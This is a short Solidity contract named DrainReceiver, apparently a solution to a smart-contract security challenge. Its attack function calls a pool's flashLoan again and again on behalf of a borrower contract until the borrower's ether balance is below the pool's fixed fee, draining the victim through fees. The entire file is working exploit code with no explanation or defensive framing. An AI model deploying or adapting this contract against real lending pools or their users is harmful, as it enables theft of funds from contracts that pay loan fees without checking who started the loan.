// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract DrainReceiver {
    function attack(
        address _pool,
        address _borrower,
        uint256 _amount
    ) external {
        while (address(_borrower).balance >= IPool(_pool).fixedFee()) {
            IPool(_pool).flashLoan(_borrower, _amount);
        }
    }
}
